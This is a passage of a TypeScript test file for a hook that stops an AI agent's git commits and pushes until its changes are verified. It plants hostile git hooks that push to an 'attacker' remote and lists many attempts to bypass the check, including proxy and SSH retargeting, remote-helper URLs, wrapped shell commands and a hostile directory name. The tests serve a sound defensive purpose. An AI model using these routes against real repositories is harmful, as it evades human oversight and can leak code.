      expect(existsSync(marker)).toBe(false);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it("qualifies a matching native global executable without a Bun PATH entry", async () => {
    const { root, guard, env } = await isolatedRecoveryFixture();
    try {
      const bin = join(root, "bin");
      mkdirSync(bin);
      const native = join(bin, process.platform === "win32" ? "semctx.exe" : "semctx");
      // The fixture runner has a native version protocol; this tests qualification only,
      // rather than claiming an installed Semctx distribution can run without Bun.
      copyFileSync(process.execPath, native);
      chmodSync(native, 0o755);
      const nativeVersion = execFileSync(process.execPath, ["--version"], { encoding: "utf8" }).trim();
      writeFileSync(join(root, ".claude-plugin", "plugin.json"), JSON.stringify({ version: nativeVersion }));
      const command = guard.verifyRecordCommand({ ...env, PATH: bin }, undefined, root);
      expect(command).toContain(`${shellQuote(native)} verify diff --record`);
      expect(guard.bunOnPath({ PATH: bin })).toBe(false);
      const hookUrl = pathToFileURL(join(root, "hooks", "guard.mjs")).href;
      const probe = `import { verifyRecordCommand } from ${JSON.stringify(hookUrl)}; console.log(verifyRecordCommand(process.env, undefined, process.cwd()));`;
      const shadowed = spawnSync(process.execPath, ["-e", probe], { cwd: bin, env: { ...process.env, PATH: "." }, encoding: "utf8" });
      expect(shadowed.status).toBe(0);
      expect(shadowed.stdout).toContain("Recovery unavailable");
      expect(shadowed.stdout).not.toContain("verify diff --record");
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it.skipIf(process.platform !== "win32")("refuses a Windows command wrapper without executing it", async () => {
    const { root, guard, env } = await isolatedRecoveryFixture();
    try {
      const bin = join(root, "bin");
      mkdirSync(bin);
      const marker = join(root, "wrapper-ran");
      writeFileSync(join(bin, "semctx.cmd"), `@echo off\r\necho unexpected > "${marker}"\r\necho ${PLUGIN_VERSION}\r\n`);
      const result = guard.verifyRecordCommand({ ...env, PATH: bin }, undefined, root);
      expect(result).toContain("unsupported Windows wrapper");
      expect(result).not.toContain("verify diff --record");
      expect(existsSync(marker)).toBe(false);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it.skipIf(!bashCanRunBun)("targets a quoted linked worktree instead of the session repository", async () => {
    const { root, guard } = await isolatedRecoveryFixture();
    try {
      const repository = join(root, "repository");
      createRecoveryRepository(repository);
      const worktree = join(root, "My worktree");
      execFileSync("git", ["worktree", "add", "-b", "linked", worktree], { cwd: repository, stdio: "ignore" });
      expect(lstatSync(join(worktree, ".git")).isFile()).toBe(true);
      mkdirSync(join(worktree, ".semctx"));
      writeFileSync(join(worktree, ".semctx", "guard.json"), '{"enabled":true}');
      writeFileSync(join(root, "dist", "semctx.js"), `if (process.argv.includes("--version")) process.stdout.write(${JSON.stringify(PLUGIN_VERSION)}); else process.stdout.write(JSON.stringify({cwd:process.cwd(),args:process.argv.slice(2)}));`);
      const decision = guard.evaluateGuard({ command: `git -C ${shellQuote(worktree)} commit -m x`, cwd: repository, sessionCwd: repository, env: { ...process.env, CLAUDE_PLUGIN_ROOT: root } });
      expect(decision.block).toBe(true);
      const printed = decision.reason.split("\n").map((line: string) => line.trim()).find((line: string) => line.startsWith("cd "));
      expect(printed).toBeDefined();
      const replay = spawnSync("bash", ["-c", printed], { cwd: repository, env: process.env, encoding: "utf8" });
      expect(replay.status).toBe(0);
      expect(JSON.parse(replay.stdout)).toEqual({ cwd: realpathSync(worktree), args: ["verify", "diff", "--record"] });
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it.skipIf(!bashCanRunBun)("replays recovery from a hostile literal repository directory", async () => {
    const { root, guard } = await isolatedRecoveryFixture();
    try {
      const repository = join(root, "it's a$b`repository");
      createRecoveryRepository(repository);
      writeFileSync(join(root, "dist", "semctx.js"), `if (process.argv.includes("--version")) process.stdout.write(${JSON.stringify(PLUGIN_VERSION)}); else process.stdout.write(JSON.stringify({cwd:process.cwd(),args:process.argv.slice(2)}));`);
      const decision = guard.evaluateGuard({ command: "git commit -m x", cwd: repository, env: { ...process.env, CLAUDE_PLUGIN_ROOT: root } });
      expect(decision.block).toBe(true);
      const printed = decision.reason.split("\n").map((line: string) => line.trim()).find((line: string) => line.startsWith("cd "));
      expect(printed).toBeDefined();
      const replay = spawnSync("bash", ["-c", printed], { cwd: root, env: process.env, encoding: "utf8" });
      expect(replay.status).toBe(0);
      expect(JSON.parse(replay.stdout)).toEqual({ cwd: realpathSync(repository), args: ["verify", "diff", "--record"] });
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it("guardDecision is pure — no env read, no filesystem access", () => {
    const previous = process.env.CLAUDE_PLUGIN_ROOT;
    process.env.CLAUDE_PLUGIN_ROOT = "/plugins/should-not-be-read";
    try {
      const d = guardDecision({ enabled: true, terminalVerb: "commit", state: null, currentState: CURRENT });
      expect(d.reason).toContain(GLOBAL_VERIFY_COMMAND);
      expect(d.reason).not.toContain("should-not-be-read");
    } finally {
      if (previous === undefined) delete process.env.CLAUDE_PLUGIN_ROOT;
      else process.env.CLAUDE_PLUGIN_ROOT = previous;
    }
  });
  it("blocks a compound terminal command before consulting a valid baseline", () => {
    const d = guardDecision({
      enabled: true,
      terminalVerb: "commit",
      commandIsolated: false,
      state: STATE,
      currentState: CURRENT,
    });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("must be an isolated command");
  });
  it("allows commit and push when the analyzed content is unchanged and HEAD materializes it", () => {
    const d = guardDecision({ enabled: true, terminalVerb: "commit", state: STATE, currentState: CURRENT });
    expect(d.block).toBe(false);
    expect(guardDecision({ enabled: true, terminalVerb: "push", state: STATE, currentState: CURRENT }).block)
      .toBe(false);
  });
  it("allows a commit SHA change but blocks content drift or a partial committed tree", () => {
    const committed = { ...CURRENT, headCommit: "b".repeat(40), workingStateHash: "sha256:new-commit" };
    expect(guardDecision({ enabled: true, terminalVerb: "push", state: STATE, currentState: committed }).block)
      .toBe(false);
    const d = guardDecision({
      enabled: true,
      terminalVerb: "push",
      state: { ...STATE, verdict: "PASS" },
      currentState: { ...CURRENT, contentStateHash: "sha256:changed" },
    });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("does not exactly materialize");
    expect(guardDecision({
      enabled: true,
      terminalVerb: "push",
      state: STATE,
      currentState: { ...CURRENT, headTreeHash: "sha256:partial" },
    }).block).toBe(true);
  });
  it("blocks when the recorded verdict was BLOCK, even if the diff is unchanged", () => {
    const d = guardDecision({ enabled: true, terminalVerb: "commit", state: { ...STATE, verdict: "BLOCK" }, currentState: CURRENT });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("was BLOCK");
  });
  it("blocks when a repository commit hook can restage after the pre-tool check", () => {
    const decision = guardDecision({
      enabled: true,
      terminalVerb: "commit",
      commitHooksAbsent: false,
      state: STATE,
      currentState: CURRENT,
    });
    expect(decision.block).toBe(true);
    expect(decision.reason).toContain("commit hooks can change the index");
  });
  it("blocks when a repository pre-push hook can add side effects after the pre-tool check", () => {
    const decision = guardDecision({
      enabled: true,
      terminalVerb: "push",
      pushHooksAbsent: false,
      state: STATE,
      currentState: CURRENT,
    });
    expect(decision.block).toBe(true);
    expect(decision.reason).toContain("pre-push hook can execute unverified side effects");
  });
  it("blocks legacy diff-only baselines", () => {
    const d = guardDecision({ enabled: true, terminalVerb: "commit", state: { diffHash: HASH, verdict: "PASS" }, currentState: CURRENT });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("legacy");
  });
  it("blocks malformed version 3 records before content comparison", () => {
    for (const malformed of [
      { ...STATE, verdict: "ALLOW" },
      { ...STATE, headCommit: "not-an-object" },
      { ...STATE, analyzedSourceHash: "truthy-junk" },
      { ...STATE, indexStateHash: "truthy-junk" },
      { ...STATE, recordedAt: "not-a-timestamp" },
    ]) {
      expect(isGuardVerificationState(malformed), JSON.stringify(malformed)).toBe(false);
      expect(guardDecision({
        enabled: true,
        terminalVerb: "commit",
        state: malformed,
        currentState: CURRENT,
      }).block).toBe(true);
    }
  });
  it("keeps the commit-bound version 2 baseline readable but non-authorizing", () => {
    const d = guardDecision({
      enabled: true,
      terminalVerb: "commit",
      state: { version: 2, headCommit: CURRENT.headCommit, workingStateHash: HASH, verdict: "PASS" },
      currentState: CURRENT,
    });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("legacy");
  });
});

describe("guardDecision — verify, commit, push replay", () => {
  it("reuses an exact pre-commit proof after commit and rejects a partial commit", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-replay-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, stdio: "ignore" });
    try {
      git(["init"]);
      writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
      writeFileSync(join(repo, "a.ts"), "export const a = 1;\n");
      writeFileSync(join(repo, "b.ts"), "export const b = 1;\n");
      git(["add", "-A"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "base"]);

      writeFileSync(join(repo, "a.ts"), "export const a = 2;\n");
      writeFileSync(join(repo, "b.ts"), "export const b = 2;\n");
      git(["add", "-A"]);
      const verified = captureVerificationGitState(repo);
      const state = { version: 3, ...verified, verdict: "PASS", recordedAt: "2026-08-31T00:00:00.000Z" };
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      writeFileSync(join(repo, ".semctx", "verification-state.json"), JSON.stringify(state));
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const guardStatus = (command: string) => spawnSync("node", [guard], {
        cwd: repo,
        input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
        encoding: "utf8",
      }).status;
      const preCommit = join(repo, ".git", "hooks", "pre-commit");
      expect(commitHookSurfaceClear(repo)).toBe(true);
      writeFileSync(preCommit, "#!/bin/sh\ngit add b.ts\n");
      expect(commitHookSurfaceClear(repo)).toBe(false);
      expect(guardStatus("git commit -m hook-restage")).toBe(2);
      rmSync(preCommit);
      const configuredHooks = join(repo, ".git", "configured-hooks");
      mkdirSync(configuredHooks);
      git(["config", "core.hooksPath", configuredHooks]);
      const prepareCommitMessage = join(configuredHooks, "prepare-commit-msg");
      writeFileSync(prepareCommitMessage, "#!/bin/sh\ngit add b.ts\n");
      expect(commitHookSurfaceClear(repo)).toBe(false);
      expect(guardStatus("git commit -m configured-hook-restage")).toBe(2);
      rmSync(prepareCommitMessage);
      expect(commitHookSurfaceClear(repo)).toBe(true);
      for (const hookName of ["post-commit", "post-rewrite"]) {
        const hook = join(configuredHooks, hookName);
        writeFileSync(hook, "#!/bin/sh\ngit push origin HEAD\n");
        expect(commitHookSurfaceClear(repo)).toBe(false);
        expect(guardStatus("git commit -m post-hook")).toBe(2);
        rmSync(hook);
      }
      for (const hookName of ["reference-transaction", "post-index-change", "pre-auto-gc", "future-git-hook"]) {
        const hook = join(configuredHooks, hookName);
        writeFileSync(hook, "#!/bin/sh\ngit push attacker HEAD\n");
        expect(commitHookSurfaceClear(repo)).toBe(false);
        expect(guardStatus("git commit -m extended-hook")).toBe(2);
        rmSync(hook);
      }
      git(["config", "--unset", "core.hooksPath"]);
      expect(guardStatus("git commit -m exact")).toBe(0);
      expect(guardStatus("git commit -am exact")).toBe(2);
      expect(guardStatus("git commit --fixup=HEAD")).toBe(2);
      expect(guardStatus("git commit --fixup=amend:HEAD")).toBe(2);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "exact"]);
      const committed = captureVerificationGitState(repo);
      expect(committed.headCommit).not.toBe(verified.headCommit);
      expect(committed.contentStateHash).toBe(verified.contentStateHash);
      expect(committed.repositoryStateHash).toBe(verified.repositoryStateHash);
      expect(committed.headTreeHash).toBe(verified.repositoryStateHash);
      expect(guardDecision({ enabled: true, terminalVerb: "push", state, currentState: committed }).block)
        .toBe(false);
      const prePush = join(repo, ".git", "hooks", "pre-push");
      expect(pushHookSurfaceClear(repo)).toBe(true);
      expect(guardStatus("git push . HEAD")).toBe(0);
      writeFileSync(prePush, "#!/bin/sh\ngit push attacker HEAD\n");
      expect(pushHookSurfaceClear(repo)).toBe(false);
      expect(guardStatus("git push . HEAD")).toBe(2);
      rmSync(prePush);
      expect(pushHookSurfaceClear(repo)).toBe(true);
      for (const hookName of ["reference-transaction", "post-index-change", "pre-auto-gc", "future-git-hook"]) {
        const hook = join(repo, ".git", "hooks", hookName);
        writeFileSync(hook, "#!/bin/sh\ngit push attacker HEAD\n");
        expect(pushHookSurfaceClear(repo)).toBe(false);
        expect(guardStatus("git push . HEAD")).toBe(2);
        rmSync(hook);
      }

      writeFileSync(join(repo, "a.ts"), "export const a = 3;\n");
      writeFileSync(join(repo, "b.ts"), "export const b = 3;\n");
      git(["add", "a.ts"]);
      const partialState = {
        version: 3,
        ...captureVerificationGitState(repo),
        verdict: "PASS",
        recordedAt: "2026-08-31T00:00:00.000Z",
      };
      writeFileSync(join(repo, ".semctx", "verification-state.json"), JSON.stringify(partialState));
      expect(partialState.indexStateHash).not.toBe(partialState.repositoryStateHash);
      expect(guardStatus("git commit -m partial")).toBe(2);
      expect(guardDecision({
        enabled: true,
        terminalVerb: "commit",
        commitContentAuthorized: true,
        state: partialState,
        currentState: partialState,
      }).block).toBe(true);
      expect(guardDecision({
        enabled: true,
        terminalVerb: "commit",
        commitContentAuthorized: false,
        state: { ...partialState, indexStateHash: partialState.repositoryStateHash },
        currentState: { ...partialState, indexStateHash: partialState.repositoryStateHash },
      }).block).toBe(true);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "partial"]);
      const partial = captureVerificationGitState(repo);
      expect(partial.contentStateHash).toBe(partialState.contentStateHash);
      expect(partial.repositoryStateHash).toBe(partialState.repositoryStateHash);
      expect(partial.headTreeHash).not.toBe(partialState.repositoryStateHash);
      expect(guardDecision({ enabled: true, terminalVerb: "push", state: partialState, currentState: partial }).block)
        .toBe(true);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  }, 30_000);
});

describe("guard runtime — large working diffs", () => {
  it("blocks every push source that is not exactly the verified HEAD", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-push-source-"));
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" }).trim();
    try {
      git(["init"]);
      writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
      writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
      git(["add", "."]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "first"]);
      git(["branch", "other"]);
      writeFileSync(join(repo, "tracked.ts"), "export const value = 2;\n");
      git(["add", "."]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "verified"]);
      git(["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "tag", "-a", "verified-tag", "-m", "verified-tag", "HEAD"]);
      const verified = captureVerificationGitState(repo);
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      writeFileSync(
        join(repo, ".semctx", "verification-state.json"),
        JSON.stringify({ version: 3, ...verified, verdict: "PASS", recordedAt: "2026-08-31T00:00:00.000Z" }),
      );

      expect(pushSourceMatchesHead("git push . HEAD:refs/heads/target", repo, verified.headCommit)).toBe(true);
      expect(pushSourceMatchesHead(`git push . ${verified.headCommit}:refs/heads/target`, repo, verified.headCommit)).toBe(true);
      expect(pushSourceMatchesHead("git push ext::helper HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push helper://target HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(true);
      expect(pushSourceMatchesHead("HTTPS_PROXY=http://127.0.0.1:9 git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("ALL_PROXY=socks5://127.0.0.1:9 git push ssh://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push --exec git-receive-pack . HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push --receive-pack git-receive-pack . HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push --push-option mutate . HEAD", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push . verified-tag:refs/tags/target", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push . HEAD~0:refs/heads/target", repo, verified.headCommit)).toBe(false);
      expect(pushSourceMatchesHead("git push . verified-tag^{}:refs/heads/target", repo, verified.headCommit)).toBe(false);
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      for (const command of [
        "git push . other:refs/heads/target",
        "git push . --signed other:refs/heads/target",
        'git push --"all" .',
        "git push -fd . HEAD",
        "git push . verified-tag:refs/tags/target",
        "git push . HEAD~1:refs/heads/target",
        "git push . HEAD~0:refs/heads/target",
        "git push . verified-tag^{}:refs/heads/target",
        "git push . :refs/heads/target",
        "git push . --all",
        "git push . --mirror",
        "git push . --recurse-submodules=on-demand",
        "git push .${IFS}--all",
        "git push --exec git-receive-pack . HEAD",
        "git push --receive-pack git-receive-pack . HEAD",
        "git push --push-option mutate . HEAD",
        "GIT_SSH=helper git push origin HEAD",
        "GIT_SSH_COMMAND=helper git push origin HEAD",
        "GIT_PROXY_COMMAND=helper git push origin HEAD",
        "HTTP_PROXY=http://127.0.0.1:9 git push https://example.invalid/repo HEAD",
        "HTTPS_PROXY=http://127.0.0.1:9 git push https://example.invalid/repo HEAD",
        "ALL_PROXY=socks5://127.0.0.1:9 git push ssh://example.invalid/repo HEAD",
        "NO_PROXY=example.invalid git push https://example.invalid/repo HEAD",
        "git push ext::helper HEAD",
        "git push helper://target HEAD",
        "git -c push.default=matching push .",
        "git -c remote.origin.push=refs/heads/*:refs/heads/* push origin",
        "git -c push.followTags=true push .",
      ]) {
        const result = spawnSync("node", [guard], {
          cwd: repo,
          input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
          encoding: "utf8",
        });
        expect(result.status, command).toBe(2);
        expect(result.stderr).toContain(
          isIsolatedTerminalGitCommand(command)
            ? "may publish only the verified HEAD"
            : "must be an isolated command",
        );
      }

      expect(pushSourceMatchesHead("git push .${IFS}--all", repo, verified.headCommit)).toBe(false);

      git(["config", "push.followTags", "true"]);
      expect(pushSourceMatchesHead("git push . HEAD:refs/heads/target", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "push.followTags"]);
      git(["config", "submodule.recurse", "true"]);
      expect(pushSourceMatchesHead("git push . HEAD:refs/heads/target", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "submodule.recurse"]);
      git(["config", "push.pushOption", "mutate"]);
      expect(pushSourceMatchesHead("git push . HEAD:refs/heads/target", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset-all", "push.pushOption"]);
      git(["config", "remote.local.push", "refs/heads/*:refs/heads/*"]);
      expect(pushSourceMatchesHead("git push . HEAD:refs/heads/target", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "remote.local.push"]);
      git(["config", "remote.origin.receivepack", "helper"]);
      expect(pushSourceMatchesHead("git push origin HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "remote.origin.receivepack"]);
      git(["config", "remote.origin.proxyAuthMethod", "basic"]);
      expect(pushSourceMatchesHead("git push origin HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "remote.origin.proxyAuthMethod"]);
      git(["config", "remote.origin.serverOption", "mutate"]);
      expect(pushSourceMatchesHead("git push origin HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset-all", "remote.origin.serverOption"]);
      git(["remote", "add", "configured", "https://example.invalid/repo"]);
      git(["config", "remote.configured.vcs", "helper"]);
      expect(pushSourceMatchesHead("git push configured HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "remote.configured.vcs"]);
      expect(pushSourceMatchesHead("git push configured HEAD", repo, verified.headCommit)).toBe(true);
      git(["remote", "remove", "configured"]);
      git(["remote", "add", "delegated", "ext::helper"]);
      expect(pushSourceMatchesHead("git push delegated HEAD", repo, verified.headCommit)).toBe(false);
      git(["remote", "remove", "delegated"]);
      git(["config", "core.sshCommand", "helper"]);
      expect(pushSourceMatchesHead("git push . HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "core.sshCommand"]);
      git(["config", "http.proxy", "http://127.0.0.1:9"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "http.proxy"]);
      git(["config", "http.https://example.invalid/.proxy", "http://127.0.0.1:9"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "http.https://example.invalid/.proxy"]);
      git(["config", "http.curloptResolve", "+example.invalid:443:127.0.0.1"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "http.curloptResolve"]);
      git(["config", "http.followRedirects", "always"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "http.followRedirects"]);
      git(["config", "http.extraHeader", "Host: other.invalid"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "http.extraHeader"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(true);
      git(["config", "url.ext::helper.pushInsteadOf", "https://example.invalid/"]);
      expect(pushSourceMatchesHead("git push https://example.invalid/repo HEAD", repo, verified.headCommit)).toBe(false);
      git(["config", "--unset", "url.ext::helper.pushInsteadOf"]);
      git(["config", "push.recurseSubmodules", "on-demand"]);
      expect(pushSourceMatchesHead("git push .", repo, verified.headCommit)).toBe(false);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  }, 30_000);

  it("blocks a compound mutation command even with a matching baseline", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-compound-"));
    try {
      execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
      writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
      writeFileSync(join(repo, ".gitignore"), ".semctx/\nignored.txt\n");
      execFileSync("git", ["add", "tracked.ts", ".gitignore"], { cwd: repo, stdio: "ignore" });
      execFileSync(
        "git",
        ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "baseline"],
        { cwd: repo, stdio: "ignore" },
      );
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      writeFileSync(
        join(repo, ".semctx", "verification-state.json"),
        JSON.stringify({
          version: 3,
          ...captureVerificationGitState(repo),
          verdict: "PASS",
          recordedAt: "2026-08-31T00:00:00.000Z",
        }),
      );

      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const unsafeCommands = [
        "powershell -Command Set-Content tracked.ts bad && git commit -am x",
        'powershell -Command "git commit -am x"',
        'pwsh -Command "git push origin main"',
        'cmd /c "git commit -am x"',
        'env bash -c "git commit -am x"',
      ];
      for (const command of unsafeCommands) {
        const result = spawnSync("node", [guard], {
          cwd: repo,
          input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
          encoding: "utf8",
        });
        expect(result.status).toBe(2);
        expect(result.stderr).toContain("must be an isolated command");
      }
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  it.skipIf(!bashCanRunBun)(
    "main() prints a verify command that a shell without CLAUDE_PLUGIN_ROOT can actually run",
    () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-plugin-cli-"));
    const pluginParent = mkdtempSync(join(tmpdir(), "semctx-guard-plugin-home-"));
    // A space in the root is the realistic hostile case for quoting.
    const pluginRoot = join(pluginParent, "My Plugin");
    try {
      execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
      writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
      writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
      execFileSync("git", ["add", "tracked.ts", ".gitignore"], { cwd: repo, stdio: "ignore" });
      execFileSync(
        "git",
        ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "baseline"],
        { cwd: repo, stdio: "ignore" },
      );
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      mkdirSync(join(pluginRoot, "dist"), { recursive: true });
      writeFileSync(join(pluginRoot, "dist", "semctx.js"), `if (process.argv.includes("--version")) process.stdout.write(${JSON.stringify(PLUGIN_VERSION)}); else process.stdout.write(JSON.stringify({cwd:process.cwd(),args:process.argv.slice(2)}));\n`);

      // No verification-state.json → block with "Run: <verify command>"
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const result = spawnSync("node", [guard], {
        cwd: repo,
        env: { ...process.env, CLAUDE_PLUGIN_ROOT: pluginRoot },
        input: JSON.stringify({
          tool_name: "Bash",
          tool_input: { command: "git commit -m x" },
          cwd: repo,
        }),
        encoding: "utf8",
      });
      expect(result.status).toBe(2);
      expect(result.stderr).toContain(join(pluginRoot, "dist", "semctx.js"));
      expect(result.stderr).not.toContain("$CLAUDE_PLUGIN_ROOT");

      // The decisive check: replay the printed command in a shell that has no CLAUDE_PLUGIN_ROOT,
      // exactly like the agent's Bash tool. A deferred "$CLAUDE_PLUGIN_ROOT/…" fails here.
      const printed = result.stderr
        .split("\n")
        .map((line) => line.trim())
        .find((line) => line.startsWith("cd "));
      expect(printed).toBeDefined();
      const { CLAUDE_PLUGIN_ROOT: _dropped, ...agentEnv } = process.env;
      const replay = spawnSync("bash", ["-c", printed!], {
        cwd: pluginParent,
        env: agentEnv,
        encoding: "utf8",
      });
      expect(replay.status).toBe(0);
      expect(JSON.parse(replay.stdout)).toEqual({ cwd: repo, args: ["verify", "diff", "--record"] });
    } finally {
      rmSync(repo, { recursive: true, force: true });
      rmSync(pluginParent, { recursive: true, force: true });
    }
  },
  );

  it("preserves the verification hash for a multi-megabyte diff", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-large-diff-"));
    try {
      execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
      writeFileSync(join(repo, "large.txt"), "a".repeat(2 * 1024 * 1024));
      writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
      execFileSync("git", ["add", "large.txt", ".gitignore"], { cwd: repo, stdio: "ignore" });
      execFileSync(
        "git",
        ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "baseline"],
        { cwd: repo, stdio: "ignore" },
      );

      writeFileSync(join(repo, "large.txt"), "b".repeat(2 * 1024 * 1024));
      execFileSync("git", ["add", "large.txt"], { cwd: repo, stdio: "ignore" });
      mkdirSync(join(repo, ".semctx"));
      writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
      writeFileSync(
        join(repo, ".semctx", "verification-state.json"),
        JSON.stringify({
          version: 3,
          ...captureVerificationGitState(repo),
          verdict: "PASS",
          recordedAt: "2026-08-31T00:00:00.000Z",
        }),
      );

      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      const result = spawnSync("node", [guard], {
        cwd: repo,
        input: JSON.stringify({
          tool_name: "Bash",
          tool_input: { command: "git commit -m x" },
          cwd: repo,
        }),
        encoding: "utf8",
      });

      expect(result.status).toBe(0);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
});

describe("guard runtime — repository scope must be explicit", () => {
  function createGuardedRepo(prefix: string) {
    const repo = mkdtempSync(join(tmpdir(), prefix));
    execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
    writeFileSync(join(repo, "tracked.ts"), "export const value = 1;\n");
    writeFileSync(join(repo, ".gitignore"), ".semctx/\n");
    execFileSync("git", ["add", "tracked.ts", ".gitignore"], { cwd: repo, stdio: "ignore" });
    execFileSync(
      "git",
      ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "baseline"],
      { cwd: repo, stdio: "ignore" },
    );
    mkdirSync(join(repo, ".semctx"));
    writeFileSync(join(repo, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
    writeFileSync(
      join(repo, ".semctx", "verification-state.json"),
      JSON.stringify({
        version: 3,
        ...captureVerificationGitState(repo),
        verdict: "PASS",
        recordedAt: "2026-08-31T00:00:00.000Z",
      }),
    );
    return repo;
  }

  it("blocks unexpanded cd and git -C targets instead of losing the guarded session", () => {
    const repo = createGuardedRepo("semctx-guard-unexpanded-");
    try {
      const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
      for (const command of [
        "cd $SEMCTX_TARGET && git commit -m x",
        "git -C $SEMCTX_TARGET push origin main",
        "git -C$SEMCTX_TARGET commit -m x",
      ]) {
        const result = spawnSync("node", [guard], {
          cwd: repo,
          env: { ...process.env, SEMCTX_TARGET: join(repo, "other") },
          input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo }),
          encoding: "utf8",
        });
        expect(result.status).toBe(2);
        expect(result.stderr).toContain("must be an isolated command");
      }
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });

  describe("blocks Git executable, environment, and CLI retargeting under a valid session baseline", () => {
    let repo = "";
    let indirectConfig = "";
    const guard = resolve(import.meta.dir, "../hooks/semctx-guard.mjs");
    const commands = (indirectConfig: string) => [
        "GIT_DIR=../other/.git GIT_WORK_TREE=../other git commit -m x",
